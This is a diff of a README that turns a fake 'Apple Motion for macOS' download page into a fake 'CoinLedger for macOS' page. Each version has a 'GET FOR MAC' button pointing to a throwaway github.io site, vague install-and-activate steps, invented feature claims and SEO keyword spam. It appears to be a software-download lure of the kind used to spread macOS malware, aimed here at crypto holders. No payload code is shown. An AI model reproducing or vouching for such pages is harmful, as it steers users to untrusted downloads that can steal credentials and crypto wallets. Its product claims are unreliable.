@@ -1,12 +1,12 @@
-# Apple Motion – Dynamic Motion Graphics & Visual Effects for macOS Creators  
+# CoinLedger – Simplified Crypto Tax & Portfolio Tracking
 
 <div align="center">  
-  <img src="https://help.apple.com/assets/67D0D685B8EF9186F10C1ED2/67D0D68A19FF34CBD8081EB3/en_US/396e961bbbecccda325b295b88d2c174.png" width="250"/>  
+  <img src="https://moralis.com/wp-content/uploads/web3wiki/1155-coinledger/6397811a31948ef3795c256e_k0CwqLPE9jZbLOp4w-CbYfIdvKTKH9KMaMo7Z0CYp4c.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-get-2025.github.io/.github/motion)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/coinledger)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Apple Motion On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate CoinLedger On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://www.provideocoalition.com/wp-content/uploads/explosion-1.jpg" width="1080"/>  
+  <img src="https://cdn.prod.website-files.com/614c99cf4f23708b27a37503/65b27fbcb59958df9b71bf6e_CoinLedger%20Open%20Graph.png" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**Apple Motion for macOS** delivers professional-grade tools for motion graphics, compositing, and cinematic visual effects — all within a clean and intuitive interface. Designed for editors and visual artists, Motion combines real-time rendering, GPU acceleration, and deep integration with Final Cut Pro to bring your creative visions to life effortlessly.  
+**CoinLedger for macOS** is an advanced cryptocurrency tax and portfolio management solution designed to automate reporting and simplify financial tracking. It brings together all your trades, transactions, and wallet activities into one unified dashboard — saving time and ensuring compliance with global tax requirements.  
 
-With **Motion**, you can craft advanced animations, glowing text effects, fluid transitions, and realistic particle systems using drag-and-drop behaviors and templates. It gives you total control over timing, depth, and lighting, empowering you to create complex compositions without writing a single line of code.  
+CoinLedger automatically syncs with leading exchanges and wallets, including **Coinbase**, **Kraken**, **Binance**, and **Metamask**, pulling in your transaction history to generate accurate tax forms instantly. Whether you’re calculating capital gains, mining income, or staking rewards, CoinLedger handles it all with precision.  
 
-From elegant title sequences to dynamic 3D animations, **Motion** provides an endless creative toolkit — all optimized for the latest **Apple Silicon** chips. Its native Metal engine ensures ultra-smooth playback, while real-time previews allow instant feedback during editing.  
+Built for both individual investors and tax professionals, the app helps users visualize portfolio performance, track unrealized gains, and prepare reports compatible with popular software such as **TurboTax**. With its clear and modern macOS interface, you can manage everything from tax calculations to profit tracking without technical complexity.  
 
-Whether you’re producing YouTube intros, broadcast graphics, or professional VFX, Motion combines performance and precision to deliver studio-quality results right from your Mac.  
+Privacy and accuracy are top priorities — your financial data remains encrypted locally, with secure cloud synchronization options available. CoinLedger ensures you’re always tax-ready while maintaining complete control over your crypto information.  
 
 ---  
 
@@ -40,14 +40,14 @@ Whether you’re producing YouTube intros, broadcast graphics, or professional V
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| ⚙️ **Real-Time Rendering Engine**            | Edit, preview, and animate simultaneously with GPU-accelerated performance. |
-| 🎨 **Advanced Motion Graphics Tools**        | Build cinematic intros, transitions, and effects with complete control.     |
-| 🪄 **3D Space Design**                        | Work with 3D text, cameras, and layers to create depth and realism.         |
-| 🔥 **Particle & Replicator Systems**         | Generate fire, smoke, sparks, and natural visual elements dynamically.      |
-| 🧠 **Customizable Behaviors & Filters**      | Add life to projects using intuitive motion controls and smart presets.    |
-| 🎬 **Final Cut Pro Compatibility**           | Easily send projects between Motion and Final Cut for seamless workflows.  |
-| 💡 **Lighting, Shadows & Reflections**       | Simulate real-world lighting for cinematic-quality scenes.                  |
-| ⚡ **Optimized for Apple Silicon**            | Designed for M1/M2 Macs to maximize performance and rendering speed.       |
+| 💰 **Automatic Tax Calculation**               | Instantly calculates crypto gains, losses, and income based on transaction history. |
+| 🔗 **Exchange & Wallet Integration**           | Connects with hundreds of wallets and trading platforms for live syncing.   |
+| 📈 **Portfolio Analytics**                     | Track holdings, asset allocation, and market performance in real time.     |
+| 🧾 **Tax Form Generation**                     | Creates IRS and TurboTax-compatible reports with one click.                 |
+| 🔒 **Data Privacy & Security**                 | All data is encrypted and stored locally on your Mac for maximum security.  |
+| 💡 **Detailed Insights**                       | Visualize profits, performance trends, and yearly summaries at a glance.   |
+| ⚙️ **Multi-Chain Compatibility**               | Supports a wide range of blockchains, tokens, and DeFi transactions.        |
+| ⚡ **Optimized for macOS & Apple Silicon**      | Runs natively on M1/M2 chips for faster data processing and smoother UI.   |
 
 ---  
 
@@ -55,14 +55,14 @@ Whether you’re producing YouTube intros, broadcast graphics, or professional V
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 12.0 or newer               |
+| OS            | macOS 11.0 or later               |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
-| Memory        | 8 GB RAM minimum (16 GB recommended) |
-| Storage       | 4 GB of available disk space      |
-| Graphics      | Metal-capable GPU required        |
+| Memory        | 4 GB RAM or higher                |
+| Storage       | 200 MB free disk space            |
+| Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-apple motion • apple motion software • motion 5 • apple motion app • apple motion photo • apple motion mac • pro motion macbook • pro motion mac • pro motion apple • motion macbook • motion apple watch face • motion apple app • macbook pro pro motion • macbook air pro motion • mac pro motion • mac motion app • ios motion • final cut pro and motion • apple watch face motion • daily motion apple tv • final cut pro motion • apple motion graphics • motion tracking final cut pro • apple motion download • apple motion 5 • alight motion macbook download • apple motion cost • apple motion price • apple pro motion  
+coinledger • coinledger app • coin ledger • coin ledger app • coinledger login • coinledger tax • coinledger pricing • ledger supported coins • ledger coin support • ledger compatible coins • bit coin ledger • coins supported by ledger • coins supported on ledger • crypto coin ledger • coin ledger tax • coinledger review • coinledger turbotax • coinledger cost • coin ledger pricing • coin ledger reviews • coinledger voyager • coinledger taxes • coin ledger taxes • coinledger mac • coinledger osx • coinledger mac app • coin ledger mac • coin ledger osx • coin ledger mac app  
